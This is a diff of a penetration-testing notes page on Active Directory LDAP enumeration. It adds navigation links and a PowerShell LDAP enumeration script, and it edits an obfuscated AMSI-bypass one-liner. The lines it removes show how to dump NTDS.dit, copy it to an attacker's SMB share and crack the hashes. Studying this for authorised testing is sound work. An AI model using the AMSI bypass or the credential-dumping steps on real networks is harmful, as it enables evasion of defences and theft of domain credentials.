@@ -11,6 +11,33 @@ tags:
 ---
 # LDAP - Active directory
 
+[Index of Active Directory](active-directory.md)
+
+[Hardening and auditing Active Directory ](hardening-auditing-active-directory.md)
+
+!!! tip "Attacking from linux"
+	- [Enumerating Active Directory from Linux](active-directory-from-linux-enumeration.md)
+	- [Attacking Active Directory from Linux](active-directory-from-linux-attacks.md)
+	- [Lateral Movement in Active Directory from Linux](active-directory-from-linux-lateral-movement.md)
+	- [Privileges escalation in Active Directory from Linux](active-directory-from-linux-privilege-escalation.md)
+
+!!! tip "Attacking from Windows"
+	- [Enumerate with ldap](ldap.md)
+	- [Enumerating Active Directory from Windows](active-directory-from-windows-enumeration.md)
+	- [Active directory: connecting to other hosts](active-directory-connections.md)
+	- [Attacking Active Directory from Windows](active-directory-from-windows-attacks.md)
+	- [Privileges escalation in Active Directory from Windows](active-directory-from-windows-privilege-escalation.md)
+
+!!! tip "Linux in AD"
+	- [Linux in active directory](linux-in-active-directory.md)
+
+
+The LDAP path's prototype looks like this:
+
+```powershell
+LDAP://HostName[:PortNumber][/DistinguishedName]
+```
+
 Active Directory (AD) is a directory service for Windows network environments.  Lightweight Directory Access Protocol (LDAP) is an integral part of Active Directory (AD). The **Lightweight Directory Access Protocol** (**LDAP**) is an open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over a TCP/IP Internet Protocol (IP) network.
 
 [And what about LDAP? See here](389-636-ldap.md).
@@ -56,7 +83,7 @@ powershell -ep bypass
 #### **Bypass AMSI**
 
 ```ps
-**S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )**
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 ```
 
 
@@ -90,6 +117,15 @@ whoami /priv
 
 
 A basic AD user account with no added privileges can be used to enumerate the majority of objects contained within AD, including but not limited to:
+
+### 0. Domain Controller
+
+```powershell
+
+# Find Primary Domain Controller (PDC) with Microsoft .NET classes. The output will reveal the PdcRoleOwner property
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+```
 
 ### **1.** Domain Computers
 
@@ -256,6 +292,122 @@ Active Directory can be easily misconfigurable. These are common attacks:
 | `([adsisearcher]"(&(objectClass=Computer))").FindAll()`                                  | Use ADSI to search for all computers                  |
 |                                                                                          |                                                       |
 
+## Building a ldap enumeration script with .NET classes
+
+We will build the following enumeration.ps1 powershell script using Microsoft .NET classes:
+
+```powershell
+# Store the domain object in the $domainObj variable
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+# Store the PdcRoleOwner name to the $PDC variable
+$PDC = $domainObj.PdcRoleOwner.Name
+
+# Store the Distinguished Name variable into the $DN variableWe can use ADSI directly in PowerShell to retrieve the DN. We'll use two single quotes to indicate that the search starts at the top of the AD hierarchy.
+$DN = ([adsi]'').distinguishedName
+
+$LDAP = "LDAP://$PDC/$DN"
+$LDAP
+```
+
+At this point the execution of the script will return something similar to:
+
+```
+LDAP://DC1.corp.com/DC=corp,DC=com
+```
+
+which is  the full LDAP path required for enumeration. On this we will build the functionality:
+
+
+
+```powershell
+# Store the domain object in the $domainObj variable
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+# Store the PdcRoleOwner name to the $PDC variable
+$PDC = $domainObj.PdcRoleOwner.Name
+
+# Store the Distinguished Name variable into the $DN variableWe can use ADSI directly in PowerShell to retrieve the DN. We'll use two single quotes to indicate that the search starts at the top of the AD hierarchy.
+$DN = ([adsi]'').distinguishedName
+
+$LDAP = "LDAP://$PDC/$DN"
+
+# the DirectoryEntry class encapsulates the LDAP path that points to the top of the hierarchy, we will pass that as a variable to DirectorySearcher.
+$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
+
+# The DirectorySearcher documentation lists FindAll(), which returns a collection of all the entries found in AD.
+$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
+
+# If we want to filter by samAccountType:
+$dirsearcher.filter="samAccountType=805306368"
+$result = $dirsearcher.FindAll()
+Foreach($obj in $result)
+{
+    Foreach($prop in $obj.Properties)
+    {
+        $prop
+    }
+
+    Write-Host "-------------------------------"
+}
+
+
+# If we want to list the groups  jeffadmin is a member of:
+$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
+$dirsearcher.filter="name=jeffadmin"
+$result = $dirsearcher.FindAll()
+Foreach($obj in $result)
+{
+    Foreach($prop in $obj.Properties)
+    {
+        $prop.memberof
+    }
+
+    Write-Host "-------------------------------"
+}
+
+## We may continue with this further
+```
+
+
+### Final ldap script with .NET classes
+
+Now let's encapsulate this in a module that allows us to run our own queries: ldapEnum.ps1
+
+```powershell
+function LDAPSearch {
+    param (
+        [string]$LDAPQuery
+    )
+
+    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+    $DistinguishedName = ([adsi]'').distinguishedName
+
+    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
+
+    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
+
+    return $DirectorySearcher.FindAll()
+
+}
+```
+
+To run our own queries:
+
+```powershell
+PS C:\Users\stephanie> Import-Module .\function.ps1
+PS C:\Users\stephanie> LDAPSearch -LDAPQuery "(samAccountType=805306368)"
+PS C:\Users\stephanie> LDAPSearch -LDAPQuery "(objectclass=group)"
+```
+
+We may also build iterations such as
+
+```powershell
+# To enumerate every group available in the domain and display the user members, we can pipe the output into a new variable and use a foreach loop that will print each property for a group.
+PS C:\Users\stephanie> foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
+$group.properties | select {$_.cn}, {$_.member}
+}
+```
 
 
 
@@ -304,62 +456,3 @@ A service principal name (SPN) is a unique identifier of a service instance. Ke
 
 User Account Control (UAC) is a fundamental component of Microsoft's overall security vision. UAC helps mitigate the impact of malware.
 
-
-## Attacking Active Directory
-
-Once a Windows system is joined to a domain, it will no longer default to referencing [the SAM database](active-directory-from-windows-privilege-escalation.md#attacking-sam) to validate logon requests. That domain-joined system will now send all authentication requests to be validated by the domain controller before allowing a user to log on. 
-
-If needed, use tools like [username Anarchy](username-anarchy.md) to create list of usernames.
-
-
-### 1. Dumping ntds.dit
-
-#### Dumping ntds.dit locally
-
-`NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources. Recall that `NTDS.dit` file is stored at `%systemroot$/ntds` on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model).
-
-The `.dit` stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html). This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain
-
-
-```shell-session
-# Connect to a DC with Evil-WinRM
-evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
-
-# To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. Check Local Group Membership:
-*Evil-WinRM* PS C:\> net localgroup
-
-# Check User Account Privileges including Domain. If the account has both Administrators and Domain Administrator rights, this means we can do just about anything we want, including making a copy of the NTDS.dit file.
-net user <username>
-
-# Use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD. Create a Shadow Copy of C:
-*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
-
-# Copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.
-*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
-```
-
-[Launch smbserver in our attacker machine](smbserver.md):
-
-```bash
-sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/username/Documents/
-```
-
-Now, from PS in the victim's windows machine:
-
-```powershell
-# Transfer the file to attacker machine
-cmd.exe /c move C:\NTDS\NTDS.dit \\$ip\CompData
-```
-
-And... crack the hash with [hashcat](hashcat.md):
-
-```bash
-sudo hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt
-```
-
-
-#### Dumpins ntds.dit remotely
-
-```bash
-crackmapexec smb $ip -u <username> -p <password> --ntds
-```
